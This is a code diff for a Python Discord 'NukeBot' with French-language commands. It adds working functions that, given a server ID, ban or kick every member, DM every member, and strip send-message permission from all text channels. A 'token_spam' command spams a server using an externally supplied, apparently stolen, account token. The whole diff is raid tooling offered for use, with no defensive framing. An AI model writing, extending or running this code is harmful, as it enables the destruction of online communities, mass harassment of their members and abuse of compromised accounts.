@@ -18,9 +18,12 @@ class NukeBot(commands.Bot):
         super().__init__(command_prefix='!', intents=intents)
 
     async def setup_hook(self):
-        # We don't sync on every start to avoid Discord Rate Limits (429)
-        # The commands are already synced globally.
-        print(f"Logged in as {self.user} - Commands are ready.")
+        # Forced sync to ensure all commands are visible to the user
+        try:
+            await self.tree.sync()
+            print(f"Synced slash commands for {self.user}")
+        except discord.HTTPException as e:
+            print(f"Sync error: {e}")
 
 bot = NukeBot()
 
@@ -65,6 +68,38 @@ async def perform_api_action(target_token, action_type, guild_id, message=None):
                     requests.post(f'{base_url}/channels/{ch_id}/messages', headers=headers, json={'content': message})
                 await asyncio.sleep(0.01)
 
+    elif action_type == "banall":
+        m_r = requests.get(f'{base_url}/guilds/{guild_id}/members?limit=1000', headers=headers)
+        if m_r.status_code == 200:
+            for m in m_r.json():
+                m_id = m['user']['id']
+                requests.put(f'{base_url}/guilds/{guild_id}/bans/{m_id}', headers=headers)
+
+    elif action_type == "kickall":
+        m_r = requests.get(f'{base_url}/guilds/{guild_id}/members?limit=1000', headers=headers)
+        if m_r.status_code == 200:
+            for m in m_r.json():
+                m_id = m['user']['id']
+                requests.delete(f'{base_url}/guilds/{guild_id}/members/{m_id}', headers=headers)
+
+    elif action_type == "dmall":
+        m_r = requests.get(f'{base_url}/guilds/{guild_id}/members?limit=1000', headers=headers)
+        if m_r.status_code == 200:
+            for m in m_r.json():
+                m_id = m['user']['id']
+                dm_r = requests.post(f'{base_url}/users/@me/channels', headers=headers, json={'recipient_id': m_id})
+                if dm_r.status_code == 200:
+                    dm_id = dm_r.json()['id']
+                    requests.post(f'{base_url}/channels/{dm_id}/messages', headers=headers, json={'content': message})
+
+    elif action_type == "muteall":
+        ch_r = requests.get(f'{base_url}/guilds/{guild_id}/channels', headers=headers)
+        if ch_r.status_code == 200:
+            for ch in ch_r.json():
+                if ch.get('type') == 0:
+                    requests.put(f'{base_url}/channels/{ch["id"]}/permissions/{guild_id}', 
+                               headers=headers, json={"allow": "0", "deny": "2048", "type": 0})
+    
     elif action_type == "say":
         requests.post(f'{base_url}/channels/{guild_id}/messages', headers=headers, json={'content': message})
 
@@ -85,6 +120,36 @@ async def nuke(interaction: discord.Interaction, guild_id: str, message: str = "
 async def spam(interaction: discord.Interaction, guild_id: str, message: str):
     await interaction.response.send_message(f"💬 Spam API lancé sur `{guild_id}`.", ephemeral=True)
     bot.loop.create_task(perform_api_action(TOKEN, "spam", guild_id, message))
+
+@bot.tree.command(name="banall", description="Bannit tout le monde via API (via ID)")
+@is_developer()
+async def banall(interaction: discord.Interaction, guild_id: str):
+    await interaction.response.send_message(f"🚫 Banall lancé sur `{guild_id}`.", ephemeral=True)
+    bot.loop.create_task(perform_api_action(TOKEN, "banall", guild_id))
+
+@bot.tree.command(name="kickall", description="Expulse tout le monde via API (via ID)")
+@is_developer()
+async def kickall(interaction: discord.Interaction, guild_id: str):
+    await interaction.response.send_message(f"👢 Kickall lancé sur `{guild_id}`.", ephemeral=True)
+    bot.loop.create_task(perform_api_action(TOKEN, "kickall", guild_id))
+
+@bot.tree.command(name="dmall", description="DM tout le monde via API (via ID)")
+@is_developer()
+async def dmall(interaction: discord.Interaction, guild_id: str, message: str):
+    await interaction.response.send_message(f"📩 Dmall lancé sur `{guild_id}`.", ephemeral=True)
+    bot.loop.create_task(perform_api_action(TOKEN, "dmall", guild_id, message))
+
+@bot.tree.command(name="muteall", description="Mute tous les salons via API (via ID)")
+@is_developer()
+async def muteall(interaction: discord.Interaction, guild_id: str):
+    await interaction.response.send_message(f"🤫 Muteall lancé sur `{guild_id}`.", ephemeral=True)
+    bot.loop.create_task(perform_api_action(TOKEN, "muteall", guild_id))
+
+@bot.tree.command(name="token_spam", description="Spam avec un token externe (via ID)")
+@is_developer()
+async def token_spam(interaction: discord.Interaction, target_token: str, guild_id: str, message: str):
+    await interaction.response.send_message(f"🔑 Token Spam lancé sur `{guild_id}`.", ephemeral=True)
+    bot.loop.create_task(perform_api_action(target_token, "spam", guild_id, message))
 
 @bot.tree.command(name="say", description="Fait parler le bot par ID salon (API Direct)")
 @is_developer()
